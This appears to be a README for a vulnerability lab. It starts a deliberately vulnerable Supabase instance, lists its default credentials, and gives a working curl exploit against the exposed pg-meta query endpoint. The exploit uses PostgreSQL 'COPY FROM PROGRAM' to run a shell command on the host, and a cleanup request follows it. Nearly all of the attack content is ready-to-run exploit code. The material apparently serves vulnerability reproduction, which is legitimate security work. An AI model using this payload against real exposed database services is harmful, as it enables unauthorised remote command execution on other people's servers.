# Start a Vulnerable instance
```bash
bash start.sh
```
# Access the exposed UI
Open your browser and navigate to `http://localhost:8001` to access the Supabase Exposed UI. Open `http://localhost:8000` to access the Supabase UI, username is `supabase` and password is `this_password_is_insecure_and_should_be_updated`
# Use the following command to run the exploit
```bash
curl 'http://127.0.0.1:8001/api/platform/pg-meta/default/query?key=' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'x-connection-encrypted: ' \
  --data-raw $'{"query":"CREATE TABLE filelist (filename text);\\nCOPY filelist FROM PROGRAM \'uname -a\';\\nSELECT * FROM filelist;","disable_statement_timeout":true}'

# cleanup
curl 'http://127.0.0.1:8001/api/platform/pg-meta/default/query?key=' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'x-connection-encrypted: ' \
  --data-raw $'{"query":"drop table filelist","disable_statement_timeout":true}'
```